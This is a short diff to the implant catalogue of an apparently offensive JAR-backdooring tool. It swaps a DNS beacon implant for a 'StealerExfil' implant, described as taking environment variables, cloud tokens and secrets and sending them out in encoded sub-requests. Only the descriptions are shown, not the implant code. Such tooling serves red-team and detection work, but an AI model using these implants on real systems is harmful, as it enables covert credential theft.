@@ -24,12 +24,11 @@ public enum ImplantInfo {
     SpringImplantConfiguration(
             io.github.w1th4d.jarplant.implants.SpringImplantConfiguration.class,
             "Template for adding your Spring implant component to a Spring configuration class."),
-    DnsBeaconImplant(
-            DnsBeaconImplant.class,
-            "Implant that gathers some basic details of a host and encodes it into a DNS query." +
-                    " Make sure to set the CONF_DOMAIN property to a DNS server under your control (like an Interactsh instance)." +
-                    " Example: 'abdcef12345.oast.fun'." +
-                    " There's a decoder available for the captured DNS queries."
+    StealerExfil(
+            StealerExfil.class,
+            "Exfiltrate host environment information and access tokens."
+                    + " Exfiltrate interesting environment variables and properties that may contain various cloud tokens and secrets."
+                    + " It encodes all exfil data using a custom compression/encoding scheme optimized for token data and splits it ut into sub-requests as necessary."
     );
 
     public final Class<?> clazz;
